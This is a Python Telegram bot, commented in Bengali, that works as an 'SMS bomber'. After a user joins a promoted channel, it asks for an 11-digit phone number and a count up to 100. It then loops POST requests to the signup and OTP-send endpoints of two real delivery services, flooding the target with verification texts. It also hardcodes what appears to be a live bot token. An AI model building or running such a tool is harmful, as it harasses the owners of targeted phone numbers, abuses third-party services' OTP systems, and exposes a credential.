import telebot
import requests
import time
from telebot import types
from flask import Flask
from threading import Thread

# ১. সেটিংস
API_TOKEN = '8678067992:AAH-gaEdP_KdS47FefM1G-Tl5HI0Wb1PQHM'
CHANNEL_USERNAME = '@developer_of_maruf' 

bot = telebot.TeleBot(API_TOKEN)
user_data = {}
verified_users = set()

app = Flask('')
@app.route('/')
def home(): return "Bot is Running!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

def check_join(chat_id):
    try:
        status = bot.get_chat_member(CHANNEL_USERNAME, chat_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    if check_join(chat_id):
        if chat_id not in verified_users:
            bot.send_message(chat_id, "✅ **ভেরিফিকেশন সফল!**")
            verified_users.add(chat_id)
        
        msg = bot.send_message(chat_id, "🎯 SMS পাঠাতে ১১ ডিজিটের নাম্বার দিন:")
        bot.register_next_step_handler(msg, get_number)
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/developer_of_maruf"))
        markup.add(types.InlineKeyboardButton("✅ Verify Done", callback_data="verify_join"))
        bot.send_message(chat_id, "❌ আগে জয়েন করুন!", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_join(call):
    if check_join(call.message.chat.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        welcome(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ জয়েন হননি!", show_alert=True)

def get_number(message):
    if not message.text.isdigit() or len(message.text) != 11:
        msg = bot.send_message(message.chat.id, "⚠️ সঠিক ১১ ডিজিট দিন:")
        bot.register_next_step_handler(msg, get_number)
        return
    user_data[message.chat.id] = message.text
    msg = bot.send_message(message.chat.id, "🔢 কয়টি SMS পাঠাবেন? (১-১০০):")
    bot.register_next_step_handler(msg, send_bomber)

# ৫. বোম্বিং প্রসেস (খুবই ধীরে কাজ করবে যাতে SMS নিশ্চিত হয়)
def send_bomber(message):
    try:
        amount = int(message.text)
        num = user_data[message.chat.id]
        if amount > 100: amount = 100 
        
        bot.send_message(message.chat.id, f"🚀 {num} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে...")
        
        for i in range(amount):
            try:
                # মাত্র ২টি শক্তিশালী API যা ব্লক হয় না সহজে
                # ১. RedX API
                requests.post("https://api-dest.redx.com.bd/v1/user/signup", json={"phone": num}, timeout=10)
                
                # ২. Pathao API
                requests.post("https://api.pathao.com/v1/auth/otp/send", json={"phone": num}, timeout=10)

                # ৫ সেকেন্ড বিরতি যাতে রিকোয়েস্ট মিস না হয় এবং বোট তাড়াহুড়ো না করে
                time.sleep(5) 
            except:
                continue
                
        bot.send_message(message.chat.id, "✅ মিশন কমপ্লিট! আবার পাঠাতে চাইলে /start লিখুন।")
    except:
        bot.send_message(message.chat.id, "❌ শুধু সংখ্যা দিন।")

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling(skip_pending=True)
